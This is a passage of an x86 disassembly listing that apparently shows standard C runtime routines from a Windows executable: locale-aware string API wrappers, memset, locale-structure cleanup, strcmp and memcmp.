  4278fd:	mov    edi,eax
  4278ff:	mov    DWORD PTR [ebp-0x1c],edi
  427902:	cmp    edi,ebx
  427904:	je     0x4279d1
  42790a:	test   BYTE PTR [ebp+0xd],0x4
  42790e:	je     0x42793d
  427910:	cmp    DWORD PTR [ebp+0x1c],ebx
  427913:	je     0x4279d1
  427919:	cmp    edi,DWORD PTR [ebp+0x1c]
  42791c:	jg     0x4279d1
  427922:	push   DWORD PTR [ebp+0x1c]
  427925:	push   DWORD PTR [ebp+0x18]
  427928:	push   esi
  427929:	push   DWORD PTR [ebp-0x2c]
  42792c:	push   DWORD PTR [ebp+0xc]
  42792f:	push   DWORD PTR [ebp+0x8]
  427932:	call   DWORD PTR ds:0x42912c
  427938:	jmp    0x4279d1
  42793d:	mov    DWORD PTR [ebp-0x4],0x2
  427944:	lea    eax,[edi+edi*1]
  427947:	add    eax,0x3
  42794a:	and    eax,0xfffffffc
  42794d:	call   0x425480
  427952:	mov    DWORD PTR [ebp-0x18],esp
  427955:	mov    eax,esp
  427957:	mov    DWORD PTR [ebp-0x30],eax
  42795a:	or     DWORD PTR [ebp-0x4],0xffffffff
  42795e:	jmp    0x42797b
  427960:	xor    eax,eax
  427962:	inc    eax
  427963:	ret    
  427964:	mov    esp,DWORD PTR [ebp-0x18]
  427967:	call   0x4288c5
  42796c:	xor    ebx,ebx
  42796e:	mov    DWORD PTR [ebp-0x30],ebx
  427971:	or     DWORD PTR [ebp-0x4],0xffffffff
  427975:	mov    edi,DWORD PTR [ebp-0x1c]
  427978:	mov    esi,DWORD PTR [ebp-0x28]
  42797b:	cmp    DWORD PTR [ebp-0x30],ebx
  42797e:	jne    0x427998
  427980:	lea    eax,[edi+edi*1]
  427983:	push   eax
  427984:	call   0x426152
  427989:	pop    ecx
  42798a:	mov    DWORD PTR [ebp-0x30],eax
  42798d:	cmp    eax,ebx
  42798f:	je     0x4279d1
  427991:	mov    DWORD PTR [ebp-0x24],0x1
  427998:	push   edi
  427999:	push   DWORD PTR [ebp-0x30]
  42799c:	push   esi
  42799d:	push   DWORD PTR [ebp-0x2c]
  4279a0:	push   DWORD PTR [ebp+0xc]
  4279a3:	push   DWORD PTR [ebp+0x8]
  4279a6:	call   DWORD PTR ds:0x42912c
  4279ac:	test   eax,eax
  4279ae:	je     0x4279d1
  4279b0:	push   ebx
  4279b1:	push   ebx
  4279b2:	cmp    DWORD PTR [ebp+0x1c],ebx
  4279b5:	jne    0x4279bb
  4279b7:	push   ebx
  4279b8:	push   ebx
  4279b9:	jmp    0x4279c1
  4279bb:	push   DWORD PTR [ebp+0x1c]
  4279be:	push   DWORD PTR [ebp+0x18]
  4279c1:	push   edi
  4279c2:	push   DWORD PTR [ebp-0x30]
  4279c5:	push   ebx
  4279c6:	push   DWORD PTR [ebp+0x20]
  4279c9:	call   DWORD PTR ds:0x4290bc
  4279cf:	mov    edi,eax
  4279d1:	cmp    DWORD PTR [ebp-0x24],ebx
  4279d4:	je     0x4279df
  4279d6:	push   DWORD PTR [ebp-0x30]
  4279d9:	call   0x42603a
  4279de:	pop    ecx
  4279df:	cmp    DWORD PTR [ebp-0x20],ebx
  4279e2:	je     0x4279ed
  4279e4:	push   DWORD PTR [ebp-0x2c]
  4279e7:	call   0x42603a
  4279ec:	pop    ecx
  4279ed:	mov    eax,edi
  4279ef:	jmp    0x427b4f
  4279f4:	mov    DWORD PTR [ebp-0x34],ebx
  4279f7:	xor    edi,edi
  4279f9:	mov    DWORD PTR [ebp-0x38],ebx
  4279fc:	cmp    DWORD PTR [ebp+0x8],ebx
  4279ff:	jne    0x427a09
  427a01:	mov    eax,ds:0x4638a4
  427a06:	mov    DWORD PTR [ebp+0x8],eax
  427a09:	cmp    DWORD PTR [ebp+0x20],ebx
  427a0c:	jne    0x427a16
  427a0e:	mov    eax,ds:0x4638b4
  427a13:	mov    DWORD PTR [ebp+0x20],eax
  427a16:	push   DWORD PTR [ebp+0x8]
  427a19:	call   0x4286ad
  427a1e:	pop    ecx
  427a1f:	mov    DWORD PTR [ebp-0x3c],eax
  427a22:	cmp    eax,0xffffffff
  427a25:	jne    0x427a2e
  427a27:	xor    eax,eax
  427a29:	jmp    0x427b4f
  427a2e:	cmp    eax,DWORD PTR [ebp+0x20]
  427a31:	je     0x427b25
  427a37:	push   ebx
  427a38:	push   ebx
  427a39:	lea    ecx,[ebp+0x14]
  427a3c:	push   ecx
  427a3d:	push   DWORD PTR [ebp+0x10]
  427a40:	push   eax
  427a41:	push   DWORD PTR [ebp+0x20]
  427a44:	call   0x4286f6
  427a49:	add    esp,0x18
  427a4c:	mov    DWORD PTR [ebp-0x34],eax
  427a4f:	cmp    eax,ebx
  427a51:	je     0x427a27
  427a53:	push   ebx
  427a54:	push   ebx
  427a55:	push   DWORD PTR [ebp+0x14]
  427a58:	push   eax
  427a59:	push   DWORD PTR [ebp+0xc]
  427a5c:	push   DWORD PTR [ebp+0x8]
  427a5f:	call   DWORD PTR ds:0x429124
  427a65:	mov    esi,eax
  427a67:	mov    DWORD PTR [ebp-0x40],esi
  427a6a:	cmp    esi,ebx
  427a6c:	je     0x427b14
  427a72:	mov    DWORD PTR [ebp-0x4],ebx
  427a75:	add    eax,0x3
  427a78:	and    eax,0xfffffffc
  427a7b:	call   0x425480
  427a80:	mov    DWORD PTR [ebp-0x18],esp
  427a83:	mov    edi,esp
  427a85:	mov    DWORD PTR [ebp-0x44],edi
  427a88:	push   esi
  427a89:	push   ebx
  427a8a:	push   edi
  427a8b:	call   0x427d30
  427a90:	add    esp,0xc
  427a93:	jmp    0x427aa5
  427a95:	xor    eax,eax
  427a97:	inc    eax
  427a98:	ret    
  427a99:	mov    esp,DWORD PTR [ebp-0x18]
  427a9c:	call   0x4288c5
  427aa1:	xor    ebx,ebx
  427aa3:	xor    edi,edi
  427aa5:	or     DWORD PTR [ebp-0x4],0xffffffff
  427aa9:	cmp    edi,ebx
  427aab:	jne    0x427ad0
  427aad:	push   DWORD PTR [ebp-0x40]
  427ab0:	call   0x426152
  427ab5:	pop    ecx
  427ab6:	mov    edi,eax
  427ab8:	cmp    edi,ebx
  427aba:	je     0x427aed
  427abc:	push   DWORD PTR [ebp-0x40]
  427abf:	push   ebx
  427ac0:	push   edi
  427ac1:	call   0x427d30
  427ac6:	add    esp,0xc
  427ac9:	mov    DWORD PTR [ebp-0x38],0x1
  427ad0:	push   DWORD PTR [ebp-0x40]
  427ad3:	push   edi
  427ad4:	push   DWORD PTR [ebp+0x14]
  427ad7:	push   DWORD PTR [ebp-0x34]
  427ada:	push   DWORD PTR [ebp+0xc]
  427add:	push   DWORD PTR [ebp+0x8]
  427ae0:	call   DWORD PTR ds:0x429124
  427ae6:	mov    DWORD PTR [ebp-0x40],eax
  427ae9:	cmp    eax,ebx
  427aeb:	jne    0x427af1
  427aed:	xor    esi,esi
  427aef:	jmp    0x427b17
  427af1:	push   DWORD PTR [ebp+0x1c]
  427af4:	push   DWORD PTR [ebp+0x18]
  427af7:	lea    eax,[ebp-0x40]
  427afa:	push   eax
  427afb:	push   edi
  427afc:	push   DWORD PTR [ebp+0x20]
  427aff:	push   DWORD PTR [ebp-0x3c]
  427b02:	call   0x4286f6
  427b07:	add    esp,0x18
  427b0a:	mov    esi,eax
  427b0c:	neg    esi
  427b0e:	sbb    esi,esi
  427b10:	neg    esi
  427b12:	jmp    0x427b17
  427b14:	mov    esi,DWORD PTR [ebp-0x48]
  427b17:	cmp    DWORD PTR [ebp-0x38],ebx
  427b1a:	je     0x427b3f
  427b1c:	push   edi
  427b1d:	call   0x42603a
  427b22:	pop    ecx
  427b23:	jmp    0x427b3f
  427b25:	push   DWORD PTR [ebp+0x1c]
  427b28:	push   DWORD PTR [ebp+0x18]
  427b2b:	push   DWORD PTR [ebp+0x14]
  427b2e:	push   DWORD PTR [ebp+0x10]
  427b31:	push   DWORD PTR [ebp+0xc]
  427b34:	push   DWORD PTR [ebp+0x8]
  427b37:	call   DWORD PTR ds:0x429124
  427b3d:	mov    esi,eax
  427b3f:	cmp    DWORD PTR [ebp-0x34],ebx
  427b42:	je     0x427b4d
  427b44:	push   DWORD PTR [ebp-0x34]
  427b47:	call   0x42603a
  427b4c:	pop    ecx
  427b4d:	mov    eax,esi
  427b4f:	lea    esp,[ebp-0x54]
  427b52:	call   0x42546f
  427b57:	ret    
  427b58:	push   0x1c
  427b5a:	push   0x429ec8
  427b5f:	call   0x425434
  427b64:	xor    esi,esi
  427b66:	cmp    DWORD PTR ds:0x4638c0,esi
  427b6c:	jne    0x427ba3
  427b6e:	lea    eax,[ebp-0x1c]
  427b71:	push   eax
  427b72:	xor    edi,edi
  427b74:	inc    edi
  427b75:	push   edi
  427b76:	push   0x429e9c
  427b7b:	push   edi
  427b7c:	call   DWORD PTR ds:0x429134
  427b82:	test   eax,eax
  427b84:	je     0x427b8e
  427b86:	mov    DWORD PTR ds:0x4638c0,edi
  427b8c:	jmp    0x427ba3
  427b8e:	call   DWORD PTR ds:0x429030
  427b94:	cmp    eax,0x78
  427b97:	jne    0x427ba3
  427b99:	mov    DWORD PTR ds:0x4638c0,0x2
  427ba3:	mov    eax,ds:0x4638c0
  427ba8:	cmp    eax,0x2
  427bab:	je     0x427c9b
  427bb1:	cmp    eax,esi
  427bb3:	je     0x427c9b
  427bb9:	cmp    eax,0x1
  427bbc:	jne    0x427cc1
  427bc2:	mov    DWORD PTR [ebp-0x20],esi
  427bc5:	mov    DWORD PTR [ebp-0x24],esi
  427bc8:	cmp    DWORD PTR [ebp+0x18],esi
  427bcb:	jne    0x427bd5
  427bcd:	mov    eax,ds:0x4638b4
  427bd2:	mov    DWORD PTR [ebp+0x18],eax
  427bd5:	push   esi
  427bd6:	push   esi
  427bd7:	push   DWORD PTR [ebp+0x10]
  427bda:	push   DWORD PTR [ebp+0xc]
  427bdd:	xor    eax,eax
  427bdf:	cmp    DWORD PTR [ebp+0x20],esi
  427be2:	setne  al
  427be5:	lea    eax,[eax*8+0x1]
  427bec:	push   eax
  427bed:	push   DWORD PTR [ebp+0x18]
  427bf0:	call   DWORD PTR ds:0x429128
  427bf6:	mov    edi,eax
  427bf8:	mov    DWORD PTR [ebp-0x28],edi
  427bfb:	test   edi,edi
  427bfd:	je     0x427cc1
  427c03:	and    DWORD PTR [ebp-0x4],0x0
  427c07:	lea    ebx,[edi+edi*1]
  427c0a:	mov    eax,ebx
  427c0c:	add    eax,0x3
  427c0f:	and    eax,0xfffffffc
  427c12:	call   0x425480
  427c17:	mov    DWORD PTR [ebp-0x18],esp
  427c1a:	mov    esi,esp
  427c1c:	mov    DWORD PTR [ebp-0x2c],esi
  427c1f:	push   ebx
  427c20:	push   0x0
  427c22:	push   esi
  427c23:	call   0x427d30
  427c28:	add    esp,0xc
  427c2b:	or     DWORD PTR [ebp-0x4],0xffffffff
  427c2f:	jmp    0x427c46
  427c31:	xor    eax,eax
  427c33:	inc    eax
  427c34:	ret    
  427c35:	mov    esp,DWORD PTR [ebp-0x18]
  427c38:	call   0x4288c5
  427c3d:	xor    esi,esi
  427c3f:	or     DWORD PTR [ebp-0x4],0xffffffff
  427c43:	mov    edi,DWORD PTR [ebp-0x28]
  427c46:	test   esi,esi
  427c48:	jne    0x427c61
  427c4a:	push   edi
  427c4b:	push   0x2
  427c4d:	call   0x426548
  427c52:	pop    ecx
  427c53:	pop    ecx
  427c54:	mov    esi,eax
  427c56:	test   esi,esi
  427c58:	je     0x427cc1
  427c5a:	mov    DWORD PTR [ebp-0x24],0x1
  427c61:	push   edi
  427c62:	push   esi
  427c63:	push   DWORD PTR [ebp+0x10]
  427c66:	push   DWORD PTR [ebp+0xc]
  427c69:	push   0x1
  427c6b:	push   DWORD PTR [ebp+0x18]
  427c6e:	call   DWORD PTR ds:0x429128
  427c74:	test   eax,eax
  427c76:	je     0x427c89
  427c78:	push   DWORD PTR [ebp+0x14]
  427c7b:	push   eax
  427c7c:	push   esi
  427c7d:	push   DWORD PTR [ebp+0x8]
  427c80:	call   DWORD PTR ds:0x429134
  427c86:	mov    DWORD PTR [ebp-0x20],eax
  427c89:	cmp    DWORD PTR [ebp-0x24],0x0
  427c8d:	je     0x427c96
  427c8f:	push   esi
  427c90:	call   0x42603a
  427c95:	pop    ecx
  427c96:	mov    eax,DWORD PTR [ebp-0x20]
  427c99:	jmp    0x427d09
  427c9b:	mov    ebx,DWORD PTR [ebp+0x1c]
  427c9e:	cmp    ebx,esi
  427ca0:	jne    0x427ca8
  427ca2:	mov    ebx,DWORD PTR ds:0x4638a4
  427ca8:	mov    edi,DWORD PTR [ebp+0x18]
  427cab:	test   edi,edi
  427cad:	jne    0x427cb5
  427caf:	mov    edi,DWORD PTR ds:0x4638b4
  427cb5:	push   ebx
  427cb6:	call   0x4286ad
  427cbb:	pop    ecx
  427cbc:	cmp    eax,0xffffffff
  427cbf:	jne    0x427cc5
  427cc1:	xor    eax,eax
  427cc3:	jmp    0x427d09
  427cc5:	cmp    eax,edi
  427cc7:	je     0x427ce7
  427cc9:	push   0x0
  427ccb:	push   0x0
  427ccd:	lea    ecx,[ebp+0x10]
  427cd0:	push   ecx
  427cd1:	push   DWORD PTR [ebp+0xc]
  427cd4:	push   eax
  427cd5:	push   edi
  427cd6:	call   0x4286f6
  427cdb:	add    esp,0x18
  427cde:	mov    esi,eax
  427ce0:	test   esi,esi
  427ce2:	je     0x427cc1
  427ce4:	mov    DWORD PTR [ebp+0xc],esi
  427ce7:	push   DWORD PTR [ebp+0x14]
  427cea:	push   DWORD PTR [ebp+0x10]
  427ced:	push   DWORD PTR [ebp+0xc]
  427cf0:	push   DWORD PTR [ebp+0x8]
  427cf3:	push   ebx
  427cf4:	call   DWORD PTR ds:0x429130
  427cfa:	mov    edi,eax
  427cfc:	test   esi,esi
  427cfe:	je     0x427d07
  427d00:	push   esi
  427d01:	call   0x42603a
  427d06:	pop    ecx
  427d07:	mov    eax,edi
  427d09:	lea    esp,[ebp-0x38]
  427d0c:	call   0x42546f
  427d11:	ret    
  427d12:	mov    eax,ds:0x4638c4
  427d17:	test   eax,eax
  427d19:	je     0x427d2a
  427d1b:	push   DWORD PTR [esp+0x4]
  427d1f:	call   eax
  427d21:	test   eax,eax
  427d23:	pop    ecx
  427d24:	je     0x427d2a
  427d26:	xor    eax,eax
  427d28:	inc    eax
  427d29:	ret    
  427d2a:	xor    eax,eax
  427d2c:	ret    
  427d2d:	int3   
  427d2e:	int3   
  427d2f:	int3   
  427d30:	mov    edx,DWORD PTR [esp+0xc]
  427d34:	mov    ecx,DWORD PTR [esp+0x4]
  427d38:	test   edx,edx
  427d3a:	je     0x427d8b
  427d3c:	xor    eax,eax
  427d3e:	mov    al,BYTE PTR [esp+0x8]
  427d42:	push   edi
  427d43:	mov    edi,ecx
  427d45:	cmp    edx,0x4
  427d48:	jb     0x427d7b
  427d4a:	neg    ecx
  427d4c:	and    ecx,0x3
  427d4f:	je     0x427d5d
  427d51:	sub    edx,ecx
  427d53:	mov    BYTE PTR [edi],al
  427d55:	add    edi,0x1
  427d58:	sub    ecx,0x1
  427d5b:	jne    0x427d53
  427d5d:	mov    ecx,eax
  427d5f:	shl    eax,0x8
  427d62:	add    eax,ecx
  427d64:	mov    ecx,eax
  427d66:	shl    eax,0x10
  427d69:	add    eax,ecx
  427d6b:	mov    ecx,edx
  427d6d:	and    edx,0x3
  427d70:	shr    ecx,0x2
  427d73:	je     0x427d7b
  427d75:	rep stos DWORD PTR es:[edi],eax
  427d77:	test   edx,edx
  427d79:	je     0x427d85
  427d7b:	mov    BYTE PTR [edi],al
  427d7d:	add    edi,0x1
  427d80:	sub    edx,0x1
  427d83:	jne    0x427d7b
  427d85:	mov    eax,DWORD PTR [esp+0x8]
  427d89:	pop    edi
  427d8a:	ret    
  427d8b:	mov    eax,DWORD PTR [esp+0x4]
  427d8f:	ret    
  427d90:	push   esi
  427d91:	mov    esi,DWORD PTR [esp+0x8]
  427d95:	test   esi,esi
  427d97:	je     0x427f1e
  427d9d:	push   DWORD PTR [esi+0x4]
  427da0:	call   0x42603a
  427da5:	push   DWORD PTR [esi+0x8]
  427da8:	call   0x42603a
  427dad:	push   DWORD PTR [esi+0xc]
  427db0:	call   0x42603a
  427db5:	push   DWORD PTR [esi+0x10]
  427db8:	call   0x42603a
  427dbd:	push   DWORD PTR [esi+0x14]
  427dc0:	call   0x42603a
  427dc5:	push   DWORD PTR [esi+0x18]
  427dc8:	call   0x42603a
  427dcd:	push   DWORD PTR [esi]
  427dcf:	call   0x42603a
  427dd4:	push   DWORD PTR [esi+0x20]
  427dd7:	call   0x42603a
  427ddc:	push   DWORD PTR [esi+0x24]
  427ddf:	call   0x42603a
  427de4:	push   DWORD PTR [esi+0x28]
  427de7:	call   0x42603a
  427dec:	push   DWORD PTR [esi+0x2c]
  427def:	call   0x42603a
  427df4:	push   DWORD PTR [esi+0x30]
  427df7:	call   0x42603a
  427dfc:	push   DWORD PTR [esi+0x34]
  427dff:	call   0x42603a
  427e04:	push   DWORD PTR [esi+0x1c]
  427e07:	call   0x42603a
  427e0c:	push   DWORD PTR [esi+0x38]
  427e0f:	call   0x42603a
  427e14:	push   DWORD PTR [esi+0x3c]
  427e17:	call   0x42603a
  427e1c:	add    esp,0x40
  427e1f:	push   DWORD PTR [esi+0x40]
  427e22:	call   0x42603a
  427e27:	push   DWORD PTR [esi+0x44]
  427e2a:	call   0x42603a
  427e2f:	push   DWORD PTR [esi+0x48]
  427e32:	call   0x42603a
  427e37:	push   DWORD PTR [esi+0x4c]
  427e3a:	call   0x42603a
  427e3f:	push   DWORD PTR [esi+0x50]
  427e42:	call   0x42603a
  427e47:	push   DWORD PTR [esi+0x54]
  427e4a:	call   0x42603a
  427e4f:	push   DWORD PTR [esi+0x58]
  427e52:	call   0x42603a
  427e57:	push   DWORD PTR [esi+0x5c]
  427e5a:	call   0x42603a
  427e5f:	push   DWORD PTR [esi+0x60]
  427e62:	call   0x42603a
  427e67:	push   DWORD PTR [esi+0x64]
  427e6a:	call   0x42603a
  427e6f:	push   DWORD PTR [esi+0x68]
  427e72:	call   0x42603a
  427e77:	push   DWORD PTR [esi+0x6c]
  427e7a:	call   0x42603a
  427e7f:	push   DWORD PTR [esi+0x70]
  427e82:	call   0x42603a
  427e87:	push   DWORD PTR [esi+0x74]
  427e8a:	call   0x42603a
  427e8f:	push   DWORD PTR [esi+0x78]
  427e92:	call   0x42603a
  427e97:	push   DWORD PTR [esi+0x7c]
  427e9a:	call   0x42603a
  427e9f:	add    esp,0x40
  427ea2:	push   DWORD PTR [esi+0x80]
  427ea8:	call   0x42603a
  427ead:	push   DWORD PTR [esi+0x84]
  427eb3:	call   0x42603a
  427eb8:	push   DWORD PTR [esi+0x88]
  427ebe:	call   0x42603a
  427ec3:	push   DWORD PTR [esi+0x8c]
  427ec9:	call   0x42603a
  427ece:	push   DWORD PTR [esi+0x90]
  427ed4:	call   0x42603a
  427ed9:	push   DWORD PTR [esi+0x94]
  427edf:	call   0x42603a
  427ee4:	push   DWORD PTR [esi+0x98]
  427eea:	call   0x42603a
  427eef:	push   DWORD PTR [esi+0x9c]
  427ef5:	call   0x42603a
  427efa:	push   DWORD PTR [esi+0xa0]
  427f00:	call   0x42603a
  427f05:	push   DWORD PTR [esi+0xa4]
  427f0b:	call   0x42603a
  427f10:	push   DWORD PTR [esi+0xa8]
  427f16:	call   0x42603a
  427f1b:	add    esp,0x2c
  427f1e:	pop    esi
  427f1f:	ret    
  427f20:	push   esi
  427f21:	mov    esi,DWORD PTR [esp+0x8]
  427f25:	test   esi,esi
  427f27:	je     0x427f7d
  427f29:	mov    eax,DWORD PTR [esi]
  427f2b:	mov    ecx,DWORD PTR ds:0x463434
  427f31:	cmp    eax,DWORD PTR [ecx]
  427f33:	je     0x427f44
  427f35:	cmp    eax,DWORD PTR ds:0x463404
  427f3b:	je     0x427f44
  427f3d:	push   eax
  427f3e:	call   0x42603a
  427f43:	pop    ecx
  427f44:	mov    eax,DWORD PTR [esi+0x4]
  427f47:	mov    ecx,DWORD PTR ds:0x463434
  427f4d:	cmp    eax,DWORD PTR [ecx+0x4]
  427f50:	je     0x427f61
  427f52:	cmp    eax,DWORD PTR ds:0x463408
  427f58:	je     0x427f61
  427f5a:	push   eax
  427f5b:	call   0x42603a
  427f60:	pop    ecx
  427f61:	mov    esi,DWORD PTR [esi+0x8]
  427f64:	mov    eax,ds:0x463434
  427f69:	cmp    esi,DWORD PTR [eax+0x8]
  427f6c:	je     0x427f7d
  427f6e:	cmp    esi,DWORD PTR ds:0x46340c
  427f74:	je     0x427f7d
  427f76:	push   esi
  427f77:	call   0x42603a
  427f7c:	pop    ecx
  427f7d:	pop    esi
  427f7e:	ret    
  427f7f:	push   esi
  427f80:	mov    esi,DWORD PTR [esp+0x8]
  427f84:	test   esi,esi
  427f86:	je     0x428056
  427f8c:	mov    eax,DWORD PTR [esi+0xc]
  427f8f:	mov    ecx,DWORD PTR ds:0x463434
  427f95:	cmp    eax,DWORD PTR [ecx+0xc]
  427f98:	je     0x427fa9
  427f9a:	cmp    eax,DWORD PTR ds:0x463410
  427fa0:	je     0x427fa9
  427fa2:	push   eax
  427fa3:	call   0x42603a
  427fa8:	pop    ecx
  427fa9:	mov    eax,DWORD PTR [esi+0x10]
  427fac:	mov    ecx,DWORD PTR ds:0x463434
  427fb2:	cmp    eax,DWORD PTR [ecx+0x10]
  427fb5:	je     0x427fc6
  427fb7:	cmp    eax,DWORD PTR ds:0x463414
  427fbd:	je     0x427fc6
  427fbf:	push   eax
  427fc0:	call   0x42603a
  427fc5:	pop    ecx
  427fc6:	mov    eax,DWORD PTR [esi+0x14]
  427fc9:	mov    ecx,DWORD PTR ds:0x463434
  427fcf:	cmp    eax,DWORD PTR [ecx+0x14]
  427fd2:	je     0x427fe3
  427fd4:	cmp    eax,DWORD PTR ds:0x463418
  427fda:	je     0x427fe3
  427fdc:	push   eax
  427fdd:	call   0x42603a
  427fe2:	pop    ecx
  427fe3:	mov    eax,DWORD PTR [esi+0x18]
  427fe6:	mov    ecx,DWORD PTR ds:0x463434
  427fec:	cmp    eax,DWORD PTR [ecx+0x18]
  427fef:	je     0x428000
  427ff1:	cmp    eax,DWORD PTR ds:0x46341c
  427ff7:	je     0x428000
  427ff9:	push   eax
  427ffa:	call   0x42603a
  427fff:	pop    ecx
  428000:	mov    eax,DWORD PTR [esi+0x1c]
  428003:	mov    ecx,DWORD PTR ds:0x463434
  428009:	cmp    eax,DWORD PTR [ecx+0x1c]
  42800c:	je     0x42801d
  42800e:	cmp    eax,DWORD PTR ds:0x463420
  428014:	je     0x42801d
  428016:	push   eax
  428017:	call   0x42603a
  42801c:	pop    ecx
  42801d:	mov    eax,DWORD PTR [esi+0x20]
  428020:	mov    ecx,DWORD PTR ds:0x463434
  428026:	cmp    eax,DWORD PTR [ecx+0x20]
  428029:	je     0x42803a
  42802b:	cmp    eax,DWORD PTR ds:0x463424
  428031:	je     0x42803a
  428033:	push   eax
  428034:	call   0x42603a
  428039:	pop    ecx
  42803a:	mov    esi,DWORD PTR [esi+0x24]
  42803d:	mov    eax,ds:0x463434
  428042:	cmp    esi,DWORD PTR [eax+0x24]
  428045:	je     0x428056
  428047:	cmp    esi,DWORD PTR ds:0x463428
  42804d:	je     0x428056
  42804f:	push   esi
  428050:	call   0x42603a
  428055:	pop    ecx
  428056:	pop    esi
  428057:	ret    
  428058:	int3   
  428059:	int3   
  42805a:	int3   
  42805b:	int3   
  42805c:	int3   
  42805d:	int3   
  42805e:	int3   
  42805f:	int3   
  428060:	push   ebp
  428061:	mov    ebp,esp
  428063:	push   esi
  428064:	xor    eax,eax
  428066:	push   eax
  428067:	push   eax
  428068:	push   eax
  428069:	push   eax
  42806a:	push   eax
  42806b:	push   eax
  42806c:	push   eax
  42806d:	push   eax
  42806e:	mov    edx,DWORD PTR [ebp+0xc]
  428071:	lea    ecx,[ecx+0x0]
  428074:	mov    al,BYTE PTR [edx]
  428076:	or     al,al
  428078:	je     0x428083
  42807a:	add    edx,0x1
  42807d:	bts    DWORD PTR [esp],eax
  428081:	jmp    0x428074
  428083:	mov    esi,DWORD PTR [ebp+0x8]
  428086:	or     ecx,0xffffffff
  428089:	lea    ecx,[ecx+0x0]
  42808c:	add    ecx,0x1
  42808f:	mov    al,BYTE PTR [esi]
  428091:	or     al,al
  428093:	je     0x42809e
  428095:	add    esi,0x1
  428098:	bt     DWORD PTR [esp],eax
  42809c:	jae    0x42808c
  42809e:	mov    eax,ecx
  4280a0:	add    esp,0x20
  4280a3:	pop    esi
  4280a4:	leave  
  4280a5:	ret    
  4280a6:	int3   
  4280a7:	int3   
  4280a8:	int3   
  4280a9:	int3   
  4280aa:	int3   
  4280ab:	int3   
  4280ac:	int3   
  4280ad:	int3   
  4280ae:	int3   
  4280af:	int3   
  4280b0:	mov    edx,DWORD PTR [esp+0x4]
  4280b4:	mov    ecx,DWORD PTR [esp+0x8]
  4280b8:	test   edx,0x3
  4280be:	jne    0x4280fc
  4280c0:	mov    eax,DWORD PTR [edx]
  4280c2:	cmp    al,BYTE PTR [ecx]
  4280c4:	jne    0x4280f4
  4280c6:	or     al,al
  4280c8:	je     0x4280f0
  4280ca:	cmp    ah,BYTE PTR [ecx+0x1]
  4280cd:	jne    0x4280f4
  4280cf:	or     ah,ah
  4280d1:	je     0x4280f0
  4280d3:	shr    eax,0x10
  4280d6:	cmp    al,BYTE PTR [ecx+0x2]
  4280d9:	jne    0x4280f4
  4280db:	or     al,al
  4280dd:	je     0x4280f0
  4280df:	cmp    ah,BYTE PTR [ecx+0x3]
  4280e2:	jne    0x4280f4
  4280e4:	add    ecx,0x4
  4280e7:	add    edx,0x4
  4280ea:	or     ah,ah
  4280ec:	jne    0x4280c0
  4280ee:	mov    edi,edi
  4280f0:	xor    eax,eax
  4280f2:	ret    
  4280f3:	nop
  4280f4:	sbb    eax,eax
  4280f6:	shl    eax,1
  4280f8:	add    eax,0x1
  4280fb:	ret    
  4280fc:	test   edx,0x1
  428102:	je     0x42811c
  428104:	mov    al,BYTE PTR [edx]
  428106:	add    edx,0x1
  428109:	cmp    al,BYTE PTR [ecx]
  42810b:	jne    0x4280f4
  42810d:	add    ecx,0x1
  428110:	or     al,al
  428112:	je     0x4280f0
  428114:	test   edx,0x2
  42811a:	je     0x4280c0
  42811c:	mov    ax,WORD PTR [edx]
  42811f:	add    edx,0x2
  428122:	cmp    al,BYTE PTR [ecx]
  428124:	jne    0x4280f4
  428126:	or     al,al
  428128:	je     0x4280f0
  42812a:	cmp    ah,BYTE PTR [ecx+0x1]
  42812d:	jne    0x4280f4
  42812f:	or     ah,ah
  428131:	je     0x4280f0
  428133:	add    ecx,0x2
  428136:	jmp    0x4280c0
  428138:	int3   
  428139:	int3   
  42813a:	int3   
  42813b:	int3   
  42813c:	int3   
  42813d:	int3   
  42813e:	int3   
  42813f:	int3   
  428140:	mov    eax,DWORD PTR [esp+0xc]
  428144:	test   eax,eax
  428146:	je     0x428192
  428148:	mov    edx,DWORD PTR [esp+0x4]
  42814c:	push   esi
  42814d:	push   edi
  42814e:	mov    esi,edx
  428150:	mov    edi,DWORD PTR [esp+0x10]
  428154:	or     edx,edi
  428156:	and    edx,0x3
  428159:	je     0x428193
  42815b:	test   eax,0x1
  428160:	je     0x428173
  428162:	mov    cl,BYTE PTR [esi]
  428164:	cmp    cl,BYTE PTR [edi]
  428166:	jne    0x4281c0
  428168:	add    esi,0x1
  42816b:	add    edi,0x1
  42816e:	sub    eax,0x1
  428171:	je     0x428190
  428173:	mov    cl,BYTE PTR [esi]
  428175:	mov    dl,BYTE PTR [edi]
  428177:	cmp    cl,dl
  428179:	jne    0x4281c0
  42817b:	mov    cl,BYTE PTR [esi+0x1]
  42817e:	mov    dl,BYTE PTR [edi+0x1]
  428181:	cmp    cl,dl
  428183:	jne    0x4281c0
  428185:	add    edi,0x2
  428188:	add    esi,0x2
  42818b:	sub    eax,0x2
  42818e:	jne    0x428173
  428190:	pop    edi
  428191:	pop    esi
  428192:	ret    
  428193:	mov    ecx,eax
  428195:	and    eax,0x3
  428198:	shr    ecx,0x2
  42819b:	je     0x4281c8
  42819d:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42819f:	je     0x4281c8
  4281a1:	mov    ecx,DWORD PTR [esi-0x4]
  4281a4:	mov    edx,DWORD PTR [edi-0x4]
  4281a7:	cmp    cl,dl
  4281a9:	jne    0x4281bb
  4281ab:	cmp    ch,dh
  4281ad:	jne    0x4281bb
  4281af:	shr    ecx,0x10
  4281b2:	shr    edx,0x10
  4281b5:	cmp    cl,dl
  4281b7:	jne    0x4281bb
  4281b9:	cmp    ch,dh
  4281bb:	mov    eax,0x0
  4281c0:	sbb    eax,eax
  4281c2:	pop    edi
  4281c3:	sbb    eax,0xffffffff
  4281c6:	pop    esi
  4281c7:	ret    
  4281c8:	test   eax,eax
  4281ca:	je     0x428190
  4281cc:	mov    edx,DWORD PTR [esi]
  4281ce:	mov    ecx,DWORD PTR [edi]
  4281d0:	cmp    dl,cl
  4281d2:	jne    0x4281bb
  4281d4:	sub    eax,0x1
  4281d7:	je     0x4281f5
  4281d9:	cmp    dh,ch
  4281db:	jne    0x4281bb
  4281dd:	sub    eax,0x1
  4281e0:	je     0x4281f5
  4281e2:	and    ecx,0xff0000
  4281e8:	and    edx,0xff0000
  4281ee:	cmp    edx,ecx
  4281f0:	jne    0x4281bb
  4281f2:	sub    eax,0x1
  4281f5:	pop    edi
  4281f6:	pop    esi
  4281f7:	ret    
  4281f8:	int3   
  4281f9:	int3   
  4281fa:	int3   
  4281fb:	int3   
  4281fc:	int3   
  4281fd:	int3   
  4281fe:	int3   
  4281ff:	int3   
  428200:	push   ebp
  428201:	mov    ebp,esp
